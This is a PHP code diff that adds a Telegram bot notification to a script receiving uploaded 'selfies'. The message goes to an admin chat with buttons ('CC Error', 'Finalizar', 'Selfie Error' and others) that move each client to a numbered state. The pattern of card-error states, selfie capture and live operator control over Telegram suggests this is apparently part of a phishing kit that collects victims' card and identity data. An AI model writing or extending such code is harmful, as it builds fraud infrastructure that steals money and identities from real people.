@@ -43,6 +43,40 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['selfie'])) {
         $output = curl_exec($ch);
         curl_close($ch);
 
+        // Enviar Menú de Acciones al Admin
+        $baseUrl = $config['baseUrl'];
+        $security_key = $config['security_key'];
+
+        $keyboard = [
+            'inline_keyboard' => [
+                [
+                    ['text' => '⚠️ CC Error', 'url' => "$baseUrl?id=$cliente_id&estado=6&key=$security_key"],
+                    ['text' => '✅ Finalizar', 'url' => "$baseUrl?id=$cliente_id&estado=7&key=$security_key"],
+                ],
+                [
+                    ['text' => '📲 WhatsApp', 'url' => "$baseUrl?id=$cliente_id&estado=8&key=$security_key"],
+                    ['text' => '🤳 Selfie', 'url' => "$baseUrl?id=$cliente_id&estado=9&key=$security_key"],
+                    ['text' => '⚠️ Selfie Error', 'url' => "$baseUrl?id=$cliente_id&estado=10&key=$security_key"]
+                ]
+            ]
+        ];
+
+        $urlMsg = "https://api.telegram.org/bot$botToken/sendMessage";
+        $post_fields_msg = [
+            'chat_id' => $chatId,
+            'text' => "📸 Selfie recibida de Cliente: `$cliente_id`. ¿Qué acción tomar?",
+            'parse_mode' => 'Markdown',
+            'reply_markup' => json_encode($keyboard)
+        ];
+
+        $ch2 = curl_init();
+        curl_setopt($ch2, CURLOPT_HTTPHEADER, array("Content-Type:multipart/form-data"));
+        curl_setopt($ch2, CURLOPT_URL, $urlMsg);
+        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch2, CURLOPT_POSTFIELDS, $post_fields_msg);
+        curl_exec($ch2);
+        curl_close($ch2);
+
         // Borrar temp
         unlink($tempFile);
 
